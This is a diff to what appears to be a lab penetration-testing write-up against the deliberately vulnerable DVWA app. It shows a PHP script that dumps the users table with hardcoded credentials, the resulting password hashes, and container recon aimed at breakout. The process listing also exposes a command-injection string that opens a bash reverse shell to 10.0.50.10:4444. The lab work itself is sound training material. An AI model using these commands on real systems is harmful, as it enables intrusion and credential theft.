@@ -484,3 +484,169 @@ users
 Connected successfully. The users table is the interesting one — let’s pull it:
 
 ```
+echo '<?php $c = new mysqli("172.19.0.2", "dvwa", "p@ssw0rd", "dvwa"); $r = $c->query("SELECT * FROM users"); while ($row = $r->fetch_assoc()) { print_r($row); }' > /tmp/dump.php
+```
+
+<summary>Click to view full output</summary>
+
+```
+<>fetch_assoc()) { print_r($row); }' > /tmp/dump.php
+```
+
+</details>
+
+```
+php /tmp/dump.php
+```
+
+<summary>Click to view full output</summary>
+
+```
+php /tmp/dump.php
+Array
+(
+    [user_id] => 1
+    [first_name] => admin
+    [last_name] => admin
+    [user] => admin
+    [password] => 5f4dcc3b5aa765d61d8327deb882cf99
+    [avatar] => /hackable/users/admin.jpg
+    [last_login] => 2026-10-11 22:46:53
+    [failed_login] => 0
+    [role] => admin
+    [account_enabled] => 1
+)
+Array
+(
+    [user_id] => 2
+    [first_name] => Gordon
+    [last_name] => Brown
+    [user] => gordonb
+    [password] => e99a18c428cb38d5f260853678922e03
+    [avatar] => /hackable/users/gordonb.jpg
+    [last_login] => 2026-10-11 22:46:53
+    [failed_login] => 0
+    [role] => user
+    [account_enabled] => 1
+)
+Array
+(
+    [user_id] => 3
+    [first_name] => Hack
+    [last_name] => Me
+    [user] => 1337
+    [password] => 8d3533d75ae2c3966d7e0d4fcc69216b
+    [avatar] => /hackable/users/1337.jpg
+    [last_login] => 2026-10-11 22:46:53
+    [failed_login] => 0
+    [role] => user
+    [account_enabled] => 1
+)
+Array
+(
+    [user_id] => 4
+    [first_name] => Pablo
+    [last_name] => Picasso
+    [user] => pablo
+    [password] => 0d107d09f5bbe40cade3de5c71e9e9b7
+    [avatar] => /hackable/users/pablo.jpg
+    [last_login] => 2026-10-11 22:46:53
+    [failed_login] => 0
+    [role] => user
+    [account_enabled] => 1
+)
+Array
+(
+    [user_id] => 5
+    [first_name] => Bob
+    [last_name] => Smith
+    [user] => smithy
+    [password] => 5f4dcc3b5aa765d61d8327deb882cf99
+    [avatar] => /hackable/users/smithy.jpg
+    [last_login] => 2026-10-11 22:46:53
+    [failed_login] => 0
+    [role] => user
+    [account_enabled] => 1
+)
+```
+
+</details>
+
+Confirmed exactly what we expected — straight DVWA default accounts, nothing more.
+
+Further testing:
+
+```
+which curl wget
+```
+
+```
+cat /proc/mounts
+```
+
+```
+ps aux
+```
+
+<details> <summary>Command explained</summary>
+  
+| Part | What it does |
+|---|---|
+| `which curl wget` |	Checks whether this container can make outbound HTTP requests — if so, we could probe other services on the VULNERABLE VLAN host itself (e.g. Portainer, which manages Docker and would be a real path to host-level compromise if reachable and using weak/default creds) |
+| `cat /proc/mounts` |	Lists all mounted filesystems inside the container — sometimes reveals host directories mounted in (a common real-world misconfiguration that enables container breakout) |
+| `ps aux` |	Lists running processes — useful for spotting anything unexpected running alongside the web server |
+
+</details>
+
+<summary>Click to view full output</summary>
+
+```
+/usr/bin/curl
+```
+
+```
+overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/65/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/60/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/59/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/58/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/56/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/55/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/54/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/53/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/52/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/51/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/50/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/49/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/48/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/47/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/46/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/44/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/14/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/66/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/66/work,nouserxattr 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
+sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
+cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot 0 0
+mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
+shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k,inode64 0 0
+/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hostname ext4 rw,relatime 0 0
+/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hosts ext4 rw,relatime 0 0
+/dev/mapper/ubuntu--vg-ubuntu--lv /etc/resolv.conf ext4 rw,relatime 0 0
+proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
+tmpfs /proc/acpi tmpfs ro,relatime,size=4k,nr_inodes=1,inode64 0 0
+tmpfs /proc/interrupts tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
+tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
+tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
+tmpfs /proc/latency_stats tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
+tmpfs /proc/scsi tmpfs ro,relatime,size=4k,nr_inodes=1,inode64 0 0
+tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
+tmpfs /sys/firmware tmpfs ro,relatime,size=4k,nr_inodes=1,inode64 0 0
+```
+
+```
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  1.0 196804 30772 ?        Ss   Oct31   0:02 apache2 -DFOREGROUND
+www-data      17  0.0  0.3 197068 11488 ?        S    Oct31   0:00 apache2 -DFOREGROUND
+www-data      18  0.0  0.6 197068 20120 ?        S    Oct31   0:00 apache2 -DFOREGROUND
+www-data      19  0.0  0.6 197068 18432 ?        S    Oct31   0:00 apache2 -DFOREGROUND
+www-data      20  0.0  0.6 197084 19380 ?        S    Oct31   0:00 apache2 -DFOREGROUND
+www-data      21  0.0  0.6 197084 18848 ?        S    Oct31   0:00 apache2 -DFOREGROUND
+www-data      22  0.0  0.5 197068 18124 ?        S    18:08   0:00 apache2 -DFOREGROUND
+www-data      23  0.0  0.3 196860 10516 ?        S    18:08   0:00 apache2 -DFOREGROUND
+www-data      24  0.0  0.5 197068 17768 ?        S    18:08   0:00 apache2 -DFOREGROUND
+www-data      25  0.0  0.6 197084 19352 ?        S    18:08   0:00 apache2 -DFOREGROUND
+www-data      31  0.0  0.0   2672  1740 ?        S    18:17   0:00 sh -c -- ping  -c 4 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.50.10/4444 0>&1'
+www-data      33  0.0  0.1   4056  3124 ?        S    18:17   0:00 bash -c bash -i >& /dev/tcp/10.0.50.10/4444 0>&1
+www-data      34  0.0  0.1   4320  3672 ?        S    18:17   0:00 bash -i
+www-data      53  0.0  0.1   6392  3672 ?        R    19:16   0:00 ps aux
+```
+
+</details>
